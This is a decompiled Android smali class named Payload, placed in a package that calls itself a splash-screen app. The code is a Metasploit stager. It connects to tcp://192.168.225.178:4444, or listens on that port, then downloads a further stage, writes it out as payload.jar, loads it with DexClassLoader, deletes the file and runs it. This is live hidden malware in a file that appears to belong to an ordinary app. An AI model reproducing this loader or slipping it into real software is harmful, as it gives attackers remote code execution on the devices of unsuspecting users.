.class public Lid/web/aiueo/androidsplashscreen/Payload;
.super Ljava/lang/Object;
.source "Payload.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lid/web/aiueo/androidsplashscreen/Payload$C00001;
    }
.end annotation


# static fields
.field public static final CERT_HASH:Ljava/lang/String; = "WWWW                                        "

.field public static final TIMEOUTS:Ljava/lang/String; = "TTTT604800-300-3600-10                         "

.field public static final URL:Ljava/lang/String; = "ZZZZtcp://192.168.225.178:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       "

.field public static comm_timeout:J

.field private static parameters:[Ljava/lang/String;

.field public static retry_total:J

.field public static retry_wait:J

.field public static session_expiry:J


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 147
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static main([Ljava/lang/String;)V
    .locals 26
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 56
    move-object/from16 v2, p0

    move-object/from16 v19, v2

    if-eqz v19, :cond_0

    .line 57
    const/16 v19, 0x1

    move/from16 v0, v19

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v19, v0

    move-object/from16 v25, v19

    move-object/from16 v19, v25

    move-object/from16 v20, v25

    const/16 v21, 0x0

    new-instance v22, Ljava/io/File;

    move-object/from16 v25, v22

    move-object/from16 v22, v25

    move-object/from16 v23, v25

    const-string v24, "."

    invoke-direct/range {v23 .. v24}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v22 .. v22}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v22

    aput-object v22, v20, v21

    sput-object v19, Lid/web/aiueo/androidsplashscreen/Payload;->parameters:[Ljava/lang/String;

    .line 59
    :cond_0
    sget-object v19, Lid/web/aiueo/androidsplashscreen/Payload;->TIMEOUTS:Ljava/lang/String;

    const/16 v20, 0x4

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v19

    const-string v20, "-"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    move-object/from16 v4, v19

    .line 61
    move-object/from16 v19, v4

    const/16 v20, 0x0

    :try_start_0
    aget-object v19, v19, v20

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v19

    move/from16 v0, v19

    int-to-long v0, v0

    move-wide/from16 v19, v0

    move-wide/from16 v5, v19

    .line 62
    move-object/from16 v19, v4

    const/16 v20, 0x1

    aget-object v19, v19, v20

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v19

    move/from16 v0, v19

    int-to-long v0, v0

    move-wide/from16 v19, v0

    move-wide/from16 v7, v19

    .line 63
    move-object/from16 v19, v4

    const/16 v20, 0x2

    aget-object v19, v19, v20

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v19

    move/from16 v0, v19

    int-to-long v0, v0

    move-wide/from16 v19, v0

    move-wide/from16 v9, v19

    .line 64
    move-object/from16 v19, v4

    const/16 v20, 0x3

    aget-object v19, v19, v20

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v19

    move/from16 v0, v19

    int-to-long v0, v0

    move-wide/from16 v19, v0

    move-wide/from16 v11, v19

    .line 65
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v19

    move-wide/from16 v13, v19

    .line 66
    sget-object v19, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-wide/from16 v20, v5

    invoke-virtual/range {v19 .. v21}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v19

    move-wide/from16 v21, v13

    add-long v19, v19, v21

    sput-wide v19, Lid/web/aiueo/androidsplashscreen/Payload;->session_expiry:J

    .line 67
    sget-object v19, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-wide/from16 v20, v7

    invoke-virtual/range {v19 .. v21}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v19

    sput-wide v19, Lid/web/aiueo/androidsplashscreen/Payload;->comm_timeout:J

    .line 68
    sget-object v19, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-wide/from16 v20, v9

    invoke-virtual/range {v19 .. v21}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v19

    sput-wide v19, Lid/web/aiueo/androidsplashscreen/Payload;->retry_total:J

    .line 69
    sget-object v19, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-wide/from16 v20, v11

    invoke-virtual/range {v19 .. v21}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v19

    sput-wide v19, Lid/web/aiueo/androidsplashscreen/Payload;->retry_wait:J

    .line 70
    sget-object v19, Lid/web/aiueo/androidsplashscreen/Payload;->URL:Ljava/lang/String;

    const/16 v20, 0x4

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v15, v19

    .line 71
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v19

    sget-wide v21, Lid/web/aiueo/androidsplashscreen/Payload;->retry_total:J

    move-wide/from16 v23, v13

    add-long v21, v21, v23

    cmp-long v19, v19, v21

    if-gez v19, :cond_1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v19

    sget-wide v21, Lid/web/aiueo/androidsplashscreen/Payload;->session_expiry:J

    cmp-long v19, v19, v21

    if-gez v19, :cond_1

    .line 81
    move-object/from16 v19, v15

    const-string v20, "tcp"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_2

    .line 82
    move-object/from16 v19, v15

    invoke-static/range {v19 .. v19}, Lid/web/aiueo/androidsplashscreen/Payload;->runStagefromTCP(Ljava/lang/String;)V

    .line 84
    :cond_1
    :goto_0
    return-void

    :cond_2
    move-object/from16 v19, v15

    invoke-static/range {v19 .. v19}, Lid/web/aiueo/androidsplashscreen/Payload;->runStageFromHTTP(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    :catch_0
    move-exception v19

    move-object/from16 v5, v19

    goto :goto_0

    :catch_1
    move-exception v19

    move-object/from16 v5, v19

    goto :goto_0
.end method

.method private static readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V
    .locals 29
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/DataInputStream;",
            "Ljava/io/OutputStream;",
            "[",
            "Ljava/lang/String;",
            ")V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 125
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object/from16 v3, p2

    move-object/from16 v19, v3

    const/16 v20, 0x0

    aget-object v19, v19, v20

    move-object/from16 v5, v19

    .line 126
    new-instance v19, Ljava/lang/StringBuffer;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v20, Ljava/lang/StringBuffer;

    move-object/from16 v28, v20

    move-object/from16 v20, v28

    move-object/from16 v21, v28

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v21, v5

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    sget-char v21, Ljava/io/File;->separatorChar:C

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    const-string v20, "payload.jar"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v6, v19

    .line 127
    new-instance v19, Ljava/lang/StringBuffer;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v20, Ljava/lang/StringBuffer;

    move-object/from16 v28, v20

    move-object/from16 v20, v28

    move-object/from16 v21, v28

    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuffer;-><init>()V

    move-object/from16 v21, v5

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v20

    sget-char v21, Ljava/io/File;->separatorChar:C

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    const-string v20, "payload.dex"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v7, v19

    .line 128
    move-object/from16 v19, v1

    invoke-virtual/range {v19 .. v19}, Ljava/io/DataInputStream;->readInt()I

    move-result v19

    move/from16 v0, v19

    new-array v0, v0, [B

    move-object/from16 v19, v0

    move-object/from16 v8, v19

    .line 129
    move-object/from16 v19, v1

    move-object/from16 v20, v8

    invoke-virtual/range {v19 .. v20}, Ljava/io/DataInputStream;->readFully([B)V

    .line 130
    new-instance v19, Ljava/lang/String;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v8

    invoke-direct/range {v20 .. v21}, Ljava/lang/String;-><init>([B)V

    move-object/from16 v9, v19

    .line 131
    move-object/from16 v19, v1

    invoke-virtual/range {v19 .. v19}, Ljava/io/DataInputStream;->readInt()I

    move-result v19

    move/from16 v0, v19

    new-array v0, v0, [B

    move-object/from16 v19, v0

    move-object/from16 v8, v19

    .line 132
    move-object/from16 v19, v1

    move-object/from16 v20, v8

    invoke-virtual/range {v19 .. v20}, Ljava/io/DataInputStream;->readFully([B)V

    .line 133
    new-instance v19, Ljava/io/File;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v6

    invoke-direct/range {v20 .. v21}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object/from16 v10, v19

    .line 134
    move-object/from16 v19, v10

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->exists()Z

    move-result v19

    if-nez v19, :cond_0

    .line 135
    move-object/from16 v19, v10

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->createNewFile()Z

    move-result v19

    .line 137
    :cond_0
    new-instance v19, Ljava/io/FileOutputStream;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v10

    invoke-direct/range {v20 .. v21}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    move-object/from16 v11, v19

    .line 138
    move-object/from16 v19, v11

    move-object/from16 v20, v8

    invoke-virtual/range {v19 .. v20}, Ljava/io/FileOutputStream;->write([B)V

    .line 139
    move-object/from16 v19, v11

    invoke-virtual/range {v19 .. v19}, Ljava/io/FileOutputStream;->flush()V

    .line 140
    move-object/from16 v19, v11

    invoke-virtual/range {v19 .. v19}, Ljava/io/FileOutputStream;->close()V

    .line 141
    new-instance v19, Ldalvik/system/DexClassLoader;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v6

    move-object/from16 v22, v5

    move-object/from16 v23, v5

    :try_start_0
    const-string v24, "id.web.aiueo.androidsplashscreen.Payload"

    invoke-static/range {v24 .. v24}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v24

    invoke-direct/range {v20 .. v24}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    move-object/from16 v20, v9

    invoke-virtual/range {v19 .. v20}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v19

    move-object/from16 v12, v19

    .line 142
    move-object/from16 v19, v12

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v19

    move-object/from16 v14, v19

    .line 143
    move-object/from16 v19, v10

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->delete()Z

    move-result v19

    .line 144
    new-instance v19, Ljava/io/File;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v7

    invoke-direct/range {v20 .. v21}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->delete()Z

    move-result v19

    .line 145
    move-object/from16 v19, v12

    const-string v20, "start"

    const/16 v21, 0x3

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v21, v0

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x0

    :try_start_1
    const-string v24, "java.io.DataInputStream"

    invoke-static/range {v24 .. v24}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v24

    aput-object v24, v22, v23

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x1

    :try_start_2
    const-string v24, "java.io.OutputStream"

    invoke-static/range {v24 .. v24}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_2
    .catch Ljava/lang/ClassNotFoundException; {:try_start_2 .. :try_end_2} :catch_2

    move-result-object v24

    aput-object v24, v22, v23

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x2

    :try_start_3
    const-string v24, "[Ljava.lang.String;"

    invoke-static/range {v24 .. v24}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_3
    .catch Ljava/lang/ClassNotFoundException; {:try_start_3 .. :try_end_3} :catch_3

    move-result-object v24

    aput-object v24, v22, v23

    invoke-virtual/range {v19 .. v21}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v19

    move-object/from16 v20, v14

    const/16 v21, 0x3

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x0

    move-object/from16 v24, v1

    aput-object v24, v22, v23

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x1

    move-object/from16 v24, v2

    aput-object v24, v22, v23

    move-object/from16 v28, v21

    move-object/from16 v21, v28

    move-object/from16 v22, v28

    const/16 v23, 0x2

    move-object/from16 v24, v3

    aput-object v24, v22, v23

    invoke-virtual/range {v19 .. v21}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v19

    .line 146
    const/16 v19, 0x0

    invoke-static/range {v19 .. v19}, Ljava/lang/System;->exit(I)V

    return-void

    .line 141
    :catch_0
    move-exception v19

    move-object/from16 v13, v19

    new-instance v19, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v13

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v19

    .line 145
    :catch_1
    move-exception v19

    move-object/from16 v15, v19

    new-instance v19, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v15

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v19

    :catch_2
    move-exception v19

    move-object/from16 v16, v19

    new-instance v19, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v16

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v19

    :catch_3
    move-exception v19

    move-object/from16 v17, v19

    new-instance v19, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v28, v19

    move-object/from16 v19, v28

    move-object/from16 v20, v28

    move-object/from16 v21, v17

    invoke-virtual/range {v21 .. v21}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v19
.end method

.method private static runStageFromHTTP(Ljava/lang/String;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 95
    move-object/from16 v0, p0

    move-object v6, v0

    const-string v7, "https"

    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 97
    new-instance v6, Ljava/net/URL;

    move-object v15, v6

    move-object v6, v15

    move-object v7, v15

    move-object v8, v0

    invoke-direct {v7, v8}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    move-object v3, v6

    .line 98
    const-string v6, "com.metasploit.stage.PayloadTrustManager"

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    const-string v7, "useFor"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Class;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    const/4 v10, 0x0

    :try_start_0
    const-string v11, "java.net.URLConnection"

    invoke-static {v11}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v11

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    const/4 v7, 0x0

    check-cast v7, Ljava/lang/Object;

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    const/4 v10, 0x0

    move-object v11, v3

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    .line 99
    move-object v6, v3

    invoke-virtual {v6}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    move-object v2, v6

    .line 103
    :goto_0
    new-instance v6, Ljava/io/DataInputStream;

    move-object v15, v6

    move-object v6, v15

    move-object v7, v15

    move-object v8, v2

    invoke-direct {v7, v8}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v7, Ljava/io/ByteArrayOutputStream;

    move-object v15, v7

    move-object v7, v15

    move-object v8, v15

    invoke-direct {v8}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v8, Lid/web/aiueo/androidsplashscreen/Payload;->parameters:[Ljava/lang/String;

    invoke-static {v6, v7, v8}, Lid/web/aiueo/androidsplashscreen/Payload;->readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V

    return-void

    .line 98
    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v15, v6

    move-object v6, v15

    move-object v7, v15

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6

    .line 101
    :cond_0
    new-instance v6, Ljava/net/URL;

    move-object v15, v6

    move-object v6, v15

    move-object v7, v15

    move-object v8, v0

    invoke-direct {v7, v8}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v6

    move-object v2, v6

    goto :goto_0
.end method

.method private static runStagefromTCP(Ljava/lang/String;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 107
    move-object v0, p0

    move-object v8, v0

    const-string v9, ":"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    move-object v3, v8

    .line 109
    move-object v8, v3

    const/4 v9, 0x2

    aget-object v8, v8, v9

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    move v4, v8

    .line 110
    move-object v8, v3

    const/4 v9, 0x1

    aget-object v8, v8, v9

    const-string v9, "/"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x2

    aget-object v8, v8, v9

    move-object v5, v8

    .line 111
    move-object v8, v5

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 112
    new-instance v8, Ljava/net/ServerSocket;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    move v10, v4

    invoke-direct {v9, v10}, Ljava/net/ServerSocket;-><init>(I)V

    move-object v6, v8

    .line 113
    move-object v8, v6

    invoke-virtual {v8}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v8

    move-object v2, v8

    .line 114
    move-object v8, v6

    invoke-virtual {v8}, Ljava/net/ServerSocket;->close()V

    .line 118
    :goto_0
    move-object v8, v2

    if-eqz v8, :cond_0

    .line 119
    move-object v8, v2

    const/16 v9, 0x1f4

    invoke-virtual {v8, v9}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 120
    new-instance v8, Ljava/io/DataInputStream;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    move-object v10, v2

    invoke-virtual {v10}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v9, Ljava/io/DataOutputStream;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    move-object v11, v2

    invoke-virtual {v11}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    sget-object v10, Lid/web/aiueo/androidsplashscreen/Payload;->parameters:[Ljava/lang/String;

    invoke-static {v8, v9, v10}, Lid/web/aiueo/androidsplashscreen/Payload;->readAndRunStage(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V

    :cond_0
    return-void

    .line 116
    :cond_1
    new-instance v8, Ljava/net/Socket;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    move-object v10, v5

    move v11, v4

    invoke-direct {v9, v10, v11}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    move-object v2, v8

    goto :goto_0
.end method

.method public static start(Landroid/content/Context;)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    .prologue
    .line 43
    move-object v0, p0

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lid/web/aiueo/androidsplashscreen/Payload;->startInPath(Ljava/lang/String;)V

    return-void
.end method

.method public static startAsync()V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 47
    new-instance v2, Lid/web/aiueo/androidsplashscreen/Payload$C00001;

    move-object v4, v2

    move-object v2, v4

    move-object v3, v4

    invoke-direct {v3}, Lid/web/aiueo/androidsplashscreen/Payload$C00001;-><init>()V

    invoke-virtual {v2}, Lid/web/aiueo/androidsplashscreen/Payload$C00001;->start()V

    return-void
.end method

.method public static startInPath(Ljava/lang/String;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 51
    move-object v0, p0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    move-object v7, v3

    move-object v3, v7

    move-object v4, v7

    const/4 v5, 0x0

    move-object v6, v0

    aput-object v6, v4, v5

    sput-object v3, Lid/web/aiueo/androidsplashscreen/Payload;->parameters:[Ljava/lang/String;

    .line 52
    invoke-static {}, Lid/web/aiueo/androidsplashscreen/Payload;->startAsync()V

    return-void
.end method
